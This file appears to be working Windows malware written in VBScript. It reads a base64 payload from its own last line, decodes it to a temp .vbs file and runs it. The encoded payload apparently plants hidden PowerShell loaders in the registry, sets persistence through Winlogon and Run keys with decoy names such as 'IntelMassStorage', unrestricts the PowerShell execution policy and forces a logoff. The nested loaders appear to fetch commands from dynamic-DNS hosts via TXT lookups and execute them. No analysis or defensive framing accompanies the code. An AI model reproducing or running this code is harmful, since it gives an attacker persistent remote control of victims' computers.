Function Base64Encode(sText)
  Dim oXML, oNode
  Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
  Set oNode = oXML.CreateElement("base64")
  oNode.dataType = "bin.base64"
  oNode.nodeTypedValue = Stream_StringToBinary(sText)
  Base64Encode = oNode.text
  Set oNode = Nothing
  Set oXML = Nothing
End Function

Function Base64Decode(ByVal vCode)
  Dim oXML, oNode
  Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
  Set oNode = oXML.CreateElement("base64")
  oNode.dataType = "bin.base64"
  oNode.text = vCode
  Base64Decode = Stream_BinaryToString(oNode.nodeTypedValue)
  Set oNode = Nothing
  Set oXML = Nothing
End Function

Private Function Stream_StringToBinary(Text)
  Const adTypeText = 2
  Const adTypeBinary = 1
  Dim BinaryStream 'As New Stream
  Set BinaryStream = CreateObject("ADODB.Stream")
  BinaryStream.Type = adTypeText
  BinaryStream.CharSet = "us-ascii"
  BinaryStream.Open
  BinaryStream.WriteText Text
  BinaryStream.Position = 0
  BinaryStream.Type = adTypeBinary
  BinaryStream.Position = 0
  Stream_StringToBinary = BinaryStream.Read
  Set BinaryStream = Nothing
End Function

Private Function Stream_BinaryToString(Binary)
  Const adTypeText = 2
  Const adTypeBinary = 1
  Dim BinaryStream 'As New Stream
  Set BinaryStream = CreateObject("ADODB.Stream")
  BinaryStream.Type = adTypeBinary
  BinaryStream.Open
  BinaryStream.Write Binary
  BinaryStream.Position = 0
  BinaryStream.Type = adTypeText
  BinaryStream.CharSet = "us-ascii"
  Stream_BinaryToString = BinaryStream.ReadText
  Set BinaryStream = Nothing
End Function

Const ForReading = 1
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objFile = objFSO.OpenTextFile("" + WScript.ScriptFullName + "", ForReading)
Do Until objFile.AtEndOfStream
    strNextLine = objFile.ReadLine
    If Len(strNextLine) > 0 Then
        strLine = strNextLine
    End If
Loop
objFile.Close
'Wscript.Echo strLine

	 'WScript.ScriptFullName
	 tempFolder = WScript.CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2)
'msgbox tempFolder
Set File = objFSO.CreateTextFile("" + tempFolder + "\" + WScript.ScriptName + ".vbs" + "")

File.Write Base64Decode(strLine)
File.Close

'MsgBox Base64Decode(strLine)
Set objShell = CreateObject("WScript.Shell")
objShell.Run Chr(34) + tempFolder + "\" + WScript.ScriptName + ".vbs" + Chr(34)
'Q3JlYXRlT2JqZWN0KCJXU2NyaXB0LlNoZWxsIikuUmVnV3JpdGUgIkhLQ1VcQVxBIiwgIkpGSkJQVWRsZEMxU1lXNWtiMjA3SkhKbFFUMHdPMlp2Y2lnN095bDdKR2h2UVQxb2IzTjBibUZ0WlRza2MyVkJQU2NnYm05dWRXMWlaWEp6TG5waGNIUnZMbTl5WnljN0pFaFRRVDBrY21WQkxsUnZVM1J5YVc1bktDa2dLeUFuTGljZ0t5QWtVa0V1Vkc5VGRISnBibWNvS1NBcklDY3VKeUFySUNSb2IwRTdKRWhUUVRza2MzUkJQU2R1YzJ4dmIydDFjQ0F0ZEhsd1pUMVVXRlFnSnlBcklDUklVMEVnS3lBa2MyVkJPeVJ6ZEhKQklEMGdhV1Y0SUNSemRFRTdhV1lnSUNna2MzUnlRU0F0YkdsclpTQWlLbE5VUVZKVFZFRlNWQ29pS1h0T1pYY3RTWFJsYlNBdFVHRjBhQ0FuUXpwY2QybHVaR2x5WEhBdWNITXhKeUF0U1hSbGJWUjVjR1VnUm1sc1pTQXRSbTl5WTJVN2ZUdHBaaUFnS0NSemRISkJJQzFzYVd0bElDSXFSVTVFS2lJcGV5Um9aWGhCSUQwZ1czSmxaMlY0WFRvNlRXRjBZMmdvSkhOMGNrRXNJQ2RUVkVGU1ZDZ3VLajhwUlU1RUp5a3VSM0p2ZFhCeld6RmRMbFpoYkhWbE8xdGllWFJsVzExZEpHSjVkR1Z6SUQwZ0tDUm9aWGhCSUMxemNHeHBkQ0FuS0M1N01uMHBKeUF0Ym1VZ0p5Y2dMWEpsY0d4aFkyVWdKMTRuTENBbk1GZ25LVHRCWkdRdFEyOXVkR1Z1ZENBdFVHRjBhQ0FuUXpwY2QybHVaR2x5WEhBdWNITXhKeUF0Vm1Gc2RXVWdKR0o1ZEdWeklDMUZibU52WkdsdVp5QmllWFJsTzJsbUlDQW9KSE4wY2tFZ0xXeHBhMlVnSWlwRlRrUkZUaW9pS1hza2MzUnlRVHNvYVdWNElDZERPbHgzYVc1a2FYSmNjQzV3Y3pFbktUdDlPeVJ5WlVFOUpISmxRU3N4T3lSeVpVRXVWRzlUZEhKcGJtY29LVHQ5TzMwNyIsICJSRUdfU1oiCkNyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpLlJlZ1dyaXRlICJIS0NVXEFcQiIsICJKRkpDUFVkbGRDMVNZVzVrYjIwN0pISmxRajB3TzJadmNpZzdPeWw3SkdodlFqMW9iM04wYm1GdFpUc2tjMlZDUFNjZ2JtOXVkVzFpWlhKekxtUmtibk11Ym1WMEp6c2tTRk5DUFNSeVpVSXVWRzlUZEhKcGJtY29LU0FySUNjdUp5QXJJQ1JTUWk1VWIxTjBjbWx1WnlncElDc2dKeTRuSUNzZ0pHaHZRanNrU0ZOQ095UnpkRUk5SjI1emJHOXZhM1Z3SUMxMGVYQmxQVlJZVkNBbklDc2dKRWhUUWlBcklDUnpaVUk3SkhOMGNrSWdQU0JwWlhnZ0pITjBRanRwWmlBZ0tDUnpkSEpDSUMxc2FXdGxJQ0lxVTFSQlVsTlVRVkpVS2lJcGUwNWxkeTFKZEdWdElDMVFZWFJvSUNkRE9seHplWE5rYVhKY2NDNXdjekVuSUMxSmRHVnRWSGx3WlNCR2FXeGxJQzFHYjNKalpUdDlPMmxtSUNBb0pITjBja0lnTFd4cGEyVWdJaXBGVGtRcUlpbDdKR2hsZUVJZ1BTQmJjbVZuWlhoZE9qcE5ZWFJqYUNna2MzUnlRaXdnSjFOVVFWSlVLQzRxUHlsRlRrUW5LUzVIY205MWNITmJNVjB1Vm1Gc2RXVTdXMko1ZEdWYlhWMGtZbmwwWlhNZ1BTQW9KR2hsZUVJZ0xYTndiR2wwSUNjb0xuc3lmU2tuSUMxdVpTQW5KeUF0Y21Wd2JHRmpaU0FuWGljc0lDY3dXQ2NwTzBGa1pDMURiMjUwWlc1MElDMVFZWFJvSUNkRE9seHplWE5rYVhKY2NDNXdjekVuSUMxV1lXeDFaU0FrWW5sMFpYTWdMVVZ1WTI5a2FXNW5JR0o1ZEdVN2FXWWdJQ2drYzNSeVFpQXRiR2xyWlNBaUtrVk9SRVZPS2lJcGV5UnpkSEpDT3locFpYZ2dKME02WEhONWMyUnBjbHh3TG5Cek1TY3BPMzA3SkhKbFFqMGtjbVZDS3pFN0pISmxRaTVVYjFOMGNtbHVaeWdwTzMwN2ZUcz0iLCAiUkVHX1NaIgpDcmVhdGVPYmplY3QoIldTY3JpcHQuU2hlbGwiKS5SZWdXcml0ZSAiSEtDVVxBXEMiLCAiSkhKbFF6MG5aR0YwWVNjN1ptOXlLRHM3S1hza2FHOURQV2h2YzNSdVlXMWxPeVJ6WlVNOUp5QmtZWFJoYzJWMExtaHZjSFJ2TG05eVp5YzdKRWhUUXowa2NtVkRMbFJ2VTNSeWFXNW5LQ2tnS3lBbkxpY2dLeUFrYUc5RE95UklVME03SkhOMFF6MG5ibk5zYjI5cmRYQWdMWFI1Y0dVOVZGaFVJQ2NnS3lBa1NGTkRJQ3NnSkhObFF6c2tjM1J5UXlBOUlHbGxlQ0FrYzNSRE8ybG1JQ0FvSkhOMGNrTWdMV3hwYTJVZ0lpcFRWRUZTVTFSQlVsUXFJaWw3VG1WM0xVbDBaVzBnTFZCaGRHZ2dKME02WEhONWMyUnBjbHh3TG5Cek1TY2dMVWwwWlcxVWVYQmxJRVpwYkdVZ0xVWnZjbU5sTzMwN2FXWWdJQ2drYzNSeVF5QXRiR2xyWlNBaUtrVk9SQ29pS1hza2FHVjRReUE5SUZ0eVpXZGxlRjA2T2sxaGRHTm9LQ1J6ZEhKRExDQW5VMVJCVWxRb0xpby9LVVZPUkNjcExrZHliM1Z3YzFzeFhTNVdZV3gxWlR0YllubDBaVnRkWFNSaWVYUmxjeUE5SUNna2FHVjRReUF0YzNCc2FYUWdKeWd1ZXpKOUtTY2dMVzVsSUNjbklDMXlaWEJzWVdObElDZGVKeXdnSnpCWUp5azdRV1JrTFVOdmJuUmxiblFnTFZCaGRHZ2dKME02WEhONWMyUnBjbHhrWVhSaExuQnpNU2NnTFZaaGJIVmxJQ1JpZVhSbGN5QXRSVzVqYjJScGJtY2dZbmwwWlR0cFppQWdLQ1J6ZEhKRElDMXNhV3RsSUNJcVJVNUVSVTRxSWlsN0pITjBja003S0dsbGVDQW5RenBjYzNselpHbHlYR1JoZEdFdWNITXhKeWs3ZlRza2NtVkRQU2RrYjI1bEp6dDlPMzA3IiwgIlJFR19TWiIKQ3JlYXRlT2JqZWN0KCJXU2NyaXB0LlNoZWxsIikuUmVnV3JpdGUgIkhLRVlfQ1VSUkVOVF9VU0VSXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzIE5UXEN1cnJlbnRWZXJzaW9uXFdpbmxvZ29uXFNoZWxsIiwgImV4cGxvcmVyLmV4ZSxjbWQgL2Mgc3RhcnQgL21pbiAvc2VwYXJhdGUgcG93ZXJzaGVsbC5leGUgLVdpbmRvd1N0eWxlIGhpZGRlbiAkdmFsQyA9IChHZXQtSXRlbVByb3BlcnR5IC1MaXRlcmFscGF0aCBIS0NVOlxBKS5DOyRzdGdDID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6QVNDSUkuR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJHZhbEMpKTtpZXggJHN0Z0MiLCAiUkVHX1NaIgpDcmVhdGVPYmplY3QoIldTY3JpcHQuU2hlbGwiKS5SZWdXcml0ZSAiSEtFWV9DVVJSRU5UX1VTRVJcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuXEludGVsTWFzc1N0b3JhZ2UiLCAiY21kIC9jIHN0YXJ0IC9taW4gL3NlcGFyYXRlIHBvd2Vyc2hlbGwuZXhlIC1XaW5kb3dTdHlsZSBoaWRkZW4gJHZhbEIgPSAoR2V0LUl0ZW1Qcm9wZXJ0eSAtTGl0ZXJhbHBhdGggSEtDVTpcQSkuQjskc3RnQiA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OkFTQ0lJLkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCR2YWxCKSk7aWV4ICRzdGdCIiwgIlJFR19TWiIgCkNyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpLlJlZ1dyaXRlICJIS0VZX0NVUlJFTlRfVVNFUlxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxSdW5cTWljcm9zb2Z0T2ZmaWNlIiwgImNtZCAvYyBzdGFydCAvbWluIC9zZXBhcmF0ZSBwb3dlcnNoZWxsLmV4ZSAtV2luZG93U3R5bGUgaGlkZGVuICR2YWxBID0gKEdldC1JdGVtUHJvcGVydHkgLUxpdGVyYWxwYXRoIEhLQ1U6XEEpLkE7JHN0Z0EgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpBU0NJSS5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygkdmFsQSkpO2lleCAkc3RnQSIsICJSRUdfU1oiIApDcmVhdGVPYmplY3QoIldTY3JpcHQuU2hlbGwiKS5SZWdXcml0ZSAiSEtFWV9DVVJSRU5UX1VTRVJcU29mdHdhcmVcTWljcm9zb2Z0XFBvd2VyU2hlbGxcMVxTaGVsbElkc1xNaWNyb3NvZnQuUG93ZXJTaGVsbFxFeGVjdXRpb25Qb2xpY3kiLCAiVW5yZXN0cmljdGVkIiwgIlJFR19TWiIKQ3JlYXRlT2JqZWN0KCJXU2NyaXB0LlNoZWxsIikuUnVuICJDOlx3aW5kb3dzXHN5c3RlbTMyXHNodXRkb3duLmV4ZSAvbCIsIDAsIGZhbHNl